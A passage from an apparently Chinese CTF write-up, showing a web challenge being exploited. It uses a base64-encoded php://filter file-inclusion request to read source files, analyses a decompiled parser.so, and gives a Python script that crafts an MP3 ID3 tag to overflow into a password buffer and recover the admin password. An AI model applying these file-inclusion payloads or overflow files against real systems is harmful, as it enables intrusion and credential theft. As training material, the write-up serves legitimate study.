class="line">$whitelist=array(&#x27;index&#x27;,&#x27;fm&#x27;,&#x27;mv&#x27;,&#x27;friend&#x27;,&#x27;disk&#x27;,&#x27;upload&#x27;,&#x27;share&#x27;,&#x27;favor&#x27;,&#x27;login&#x27;,&#x27;reg&#x27;,&#x27;feedback&#x27;,&#x27;firmware&#x27;,&#x27;search&#x27;,&#x27;logout&#x27;,&#x27;info&#x27;);</span><br><span class="line">if (!in_array($page,$whitelist,true)) $page=&#x27;404&#x27;;</span><br><span class="line"></span><br><span class="line">include &quot;include/$page.php&quot;;</span><br></pre></td></tr></table></figure><p>上面代码看到<br><a href="Obsidian%E7%9B%B8%E5%85%B3/picture%E4%BB%93%E5%BA%93/5f4ecbf1c6c7fafea6b505d26fb58ea4_MD5.jpg">Open: Pasted image 20251106201520 1.png</a><br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641131-494c44b8-486d-4e07-b60b-db32c5c4a8d5.jpg" alt="null"></p><p>读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvY29uZmlnLnBocA==&quot;</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=../include/config.php</span><br><span class="line">#config.php</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;display_errors&#x27;,&#x27;Off&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">date_default_timezone_set(&quot;Asia/Shanghai&quot;);</span><br><span class="line"></span><br><span class="line">ini_set(&#x27;session.gc_maxlifetime&#x27;,&quot;3600&quot;);</span><br><span class="line">ini_set(&quot;session.cookie_lifetime&quot;,&quot;3600&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include &#x27;init.php&#x27;;</span><br><span class="line"></span><br><span class="line">$_GLOBALS[&#x27;dbfile&#x27;]=init_config(&#x27;.sqlite&#x27;);</span><br><span class="line">$_GLOBALS[&#x27;salt&#x27;]=write_config(init_config(&#x27;.salt&#x27;));</span><br><span class="line">$_GLOBALS[&#x27;admin_password&#x27;]=write_config(init_config(&#x27;.passwd&#x27;));</span><br><span class="line">if (strlen($_GLOBALS[&#x27;dbfile&#x27;])&lt;=0||strlen($_GLOBALS[&#x27;salt&#x27;])&lt;=0||strlen($_GLOBALS[&#x27;admin_password&#x27;])&lt;=0)&#123;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    die(&#x27;Permission denied!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$_GLOBALS[&#x27;dbfile&#x27;]=__DIR__.&#x27;/../config/&#x27;.$_GLOBALS[&#x27;dbfile&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到init.php<br>看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_str</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_filename</span>(<span class="params"><span class="variable">$ext</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$files</span>=<span class="title function_ invoke__">scandir</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>,-<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext</span>))===<span class="variable">$ext</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_config</span>(<span class="params"><span class="variable">$ext</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">get_filename</span>(<span class="variable">$ext</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">rand_str</span>(<span class="number">8</span>).<span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>.<span class="variable">$file</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>.<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_config</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_config</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>,<span class="variable">$length</span> = <span class="number">16</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$content</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>==<span class="string">&#x27;&#x27;</span>) <span class="variable">$str</span>=<span class="title function_ invoke__">rand_str</span>(<span class="variable">$length</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>.<span class="variable">$file</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/&#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641259-2b907429-8c71-4211-b8ec-8b9534fc085c.jpg" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641385-a2fb28f8-4e6e-4776-8ad6-da8acc56e956.jpg" alt="null"></p><p>这里是看一下 parser.so文件<br>从init_proc看起</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641497-129fb422-c384-4e65-ba5a-c9c60ddc2d6b.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 (**init_proc_0())(void)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (**__gmon_start_)(void); // rax</span><br><span class="line"></span><br><span class="line">  __gmon_start_ = &amp;_gmon_start__;</span><br><span class="line">  if ( &amp;_gmon_start__ )</span><br><span class="line">    return (__int64 (**)(void))_gmon_start__();</span><br><span class="line">  return __gmon_start_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没什么好看的继续看</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641596-aed5ed39-6d95-4183-adda-00f5c1a3ac62.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#init_proc</span><br><span class="line">void *init_proc()</span><br><span class="line">&#123;</span><br><span class="line">  frame_size = 0;</span><br><span class="line">  frame_data = &amp;frame_data;</span><br><span class="line">  memset(&amp;frame_data, 0, 0x100u);</span><br><span class="line">  passwd = &amp;passwd;</span><br><span class="line">  return memset(&amp;passwd, 0, 0x130u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次接触用pwn的web漏洞，喂给AI看一下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641695-fae97d1a-b2c3-48a4-bb68-c20c1f69908f.jpg" alt="null"></p><p>其中&amp;passwd在bss段中为93c0，而上面的&amp;frame_data在92c0。</p><ul><li><p>frame_data 占用了 0x100 字节（256 字节），从 92C0 到 93C0 是连续的。</p></li><li><p>passwd 的起始地址为 93C0，说明它紧跟在 frame_data 之后。</p></li><li><p>如果对 frame_data 的数据写入超过了 0x100 字节，就可能越界到 passwd 的地址空间。由于PHP中的文件限制长度为0x130字节，因此有0x30的溢出读空间。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment"># coding:utf-8  </span></span><br><span class="line"><span class="comment"># 专为 Python3 编写，无任何编码/拼接报错  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flat</span>(<span class="params">*args</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;字节流拼接函数（仅处理字节类型，彻底避免类型错误）&quot;&quot;&quot;</span>  </span><br><span class="line">    result = <span class="string">b&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(arg, <span class="built_in">bytes</span>):  </span><br><span class="line">            result += arg  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># 强制转换为字节（确保所有输入统一类型）  </span></span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;仅支持 bytes 类型，传入了 <span class="subst">&#123;<span class="built_in">type</span>(arg)&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 1. 按你提供的结构，所有内容转为 bytes 类型（核心修改）  </span></span><br><span class="line">mp3_tag = flat(  </span><br><span class="line">    <span class="string">b&#x27;ID3&#x27;</span>,                                   <span class="comment"># 标签标识（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x03&#x27;</span>,                                  <span class="comment"># 主版本号（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span>,                                  <span class="comment"># 修订号（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span>,                                  <span class="comment"># 标志位（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00\x00\x04\x00&#x27;</span>,                      <span class="comment"># 标签头大小（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;TIT2&#x27;</span>,                                  <span class="comment"># 帧标识（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00\x00\x00\x0a&#x27;</span>,                      <span class="comment"># TIT2 帧大小（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00\x00&#x27;</span>,                              <span class="comment"># TIT2 帧标志（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span> + <span class="string">b&#x27;\x00&#x27;</span>,                         <span class="comment"># TIT2 内容（bytes，9个&#x27;a&#x27; + 结束符）  </span></span><br><span class="line">    <span class="string">b&#x27;TPE1&#x27;</span>,                                  <span class="comment"># 帧标识（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00\x00\x00\x0a&#x27;</span>,                      <span class="comment"># TPE1 帧大小（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00\x00&#x27;</span>,                              <span class="comment"># TPE1 帧标志（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;b&#x27;</span>*<span class="number">9</span> + <span class="string">b&#x27;\x00&#x27;</span>,                         <span class="comment"># TPE1 内容（bytes，9个&#x27;b&#x27; + 结束符）  </span></span><br><span class="line">    <span class="string">b&#x27;TALB&#x27;</span>,                                  <span class="comment"># 帧标识（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00\x00\x02\xff&#x27;</span>,                      <span class="comment"># TALB 帧大小（bytes，按你提供的配置）  </span></span><br><span class="line">    <span class="string">b&#x27;\x00\x00&#x27;</span>,                              <span class="comment"># TALB 帧标志（bytes）  </span></span><br><span class="line">    <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x200</span> + <span class="string">b&#x27;\x00&#x27;</span>,                     <span class="comment"># TALB 内容（bytes，512个&#x27;c&#x27; + 结束符）  </span></span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 2. 添加标准 MP3 音频帧（确保文件被识别为有效 MP3，不报错）  </span></span><br><span class="line"><span class="comment"># 标准 MPEG-1 Layer 3 音频帧（44.1kHz 单声道，128kbps，持续0.5秒）  </span></span><br><span class="line">mp3_audio = (  </span><br><span class="line">    <span class="string">b&#x27;\xff\xf3\xc4\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>  </span><br><span class="line">    <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>  </span><br><span class="line">    <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 3. 拼接标签 + 音频，生成完整 MP3 文件  </span></span><br><span class="line">full_mp3 = mp3_tag + mp3_audio  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 4. 写入文件（二进制模式，Python3 标准写法）  </span></span><br><span class="line">output_file = <span class="string">&quot;fake_mp3_no_error.mp3&quot;</span>  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(full_mp3)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;✅ 零报错！伪造 MP3 已生成：<span class="subst">&#123;output_file&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;📌 标签结构完全按你的配置：ID3v2.3 + TIT2/TPE1/TALB 帧&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;🎵 包含有效音频帧，可正常播放/上传绕过&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641790-6b496974-a477-498e-b47f-b707966a8ca2.jpg" alt="null"></p><p>得到密码wc4I22tosZFIsUIk</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641867-e077a4ce-d89d-42df-87e0-4d49a0a73837.jpg" alt="null"><br>用admin登录进去</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641938-44089e3a-8845-4e96-9394-b3894933b665.jpg" alt="null"></p><p>也是成功登录了</p><p>来到&#x2F;#firmware页面</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431642012-5cb72fe6-9abe-49ed-83a2-9469b79ec1bb.jpg" alt="null"></p><p>这里老方法读取一下frimware代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;http://af97e55c-3987-499d-99e5-e8acff7feafd.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvZmlybXdhcmUucGhw&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#firmware.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])||<span class="title function_ invoke__">strlen</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /hotload.php?page=login&amp;err=1&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>]!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$padding</span>=<span class="string">&#x27;Lorem ipsum dolor sit amet, consectetur adipisicing elit.&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++) <span class="variable">$padding</span>.=<span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt;&lt;h3 style=&quot;color:red;margin-bottom:15px;&quot;&gt;只有管理员权限才能访问！&lt;/h3&gt;&lt;/div&gt;&lt;p style=&quot;visibility: hidden&quot;&gt;&#x27;</span>.<span class="variable">$padding</span>.<span class="string">&#x27;&lt;/p&gt;&lt;/div&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file_data&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file_data&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>||<span class="variable">$_FILES</span>[<span class="string">&quot;file_data&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;上传出错，固件文件最大支持 1MB。&#x27;</span>)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">        <span class="variable">$firmware_filename</span>=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="variable">$firmware_filename</span>=<span class="keyword">__DIR__</span>.<span class="string">&quot;/../uploads/firmware/&quot;</span>.<span class="variable">$firmware_filename</span>.<span class="string">&quot;.elf&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">time</span>()-<span class="variable">$_SESSION</span>[<span class="string">&#x27;timestamp&#x27;</span>]&lt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;操作太快了，请稍后再上传。&#x27;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;timestamp&#x27;</span>]=<span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file_data&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$firmware_filename</span>);</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$firmware_filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$handle</span>==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;上传失败，未知原因。&#x27;</span>)));</span><br><span 